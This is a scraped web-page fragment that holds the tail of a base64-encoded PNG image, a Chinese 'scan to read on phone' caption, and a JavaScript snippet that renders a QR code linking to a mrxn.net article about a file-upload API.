QHP3X9xBv6U1w+x4CmRY8h2fnd+r6IH3l5iE6BNVF/SuE1AE7iz2A+8/6GroOcx7CIajfenGlQ+r0rdB6iB+4vofc3uxj+5LltM6wn18/ZMo9D7MOM7feOpjz6iu0vrB7IL0qVwHh+kobQ32Fo7fWZ75n89XL2AayKr70372B3UAgTxHMuDoWxGcewiGo7hMgQvIQVNcvQvJyEaLDHvX8LfazQPawH4RDcKXDnD/rW312AynxitfdwI8PxKego58izE+Numhd52d65a0RS6voHHIGCK7y6iLMfnWx9hqj65B6CJof8ccHMja/1l+/gW8PxCfCrWGePsxcn9jr1eHzuu4DlLa/59iEjwVwfz/y7J7dJxc/2m77QfpD0DzMvNdD8sD1PuT2Zh+7V4jT63h2bv36IFPveuf6VwjpY956mHXzI0I8EBxz4xrmfN+jc5j9EK7P3vKOEL++EXcDGZPX+vdvYBsIZGrwOa6OCKnrT4N+SB6C+iAcgvrF7lN/Bq1deXteDjnLiquf9YX0gRmtF8c+20BG8Vq/7gaugbzu7g93/hcAAP//V2Ks9wAAAAZJREFUAwBX9fK5x4BlWQAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/api-wxapps-onepic\_uploade-fileupload.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 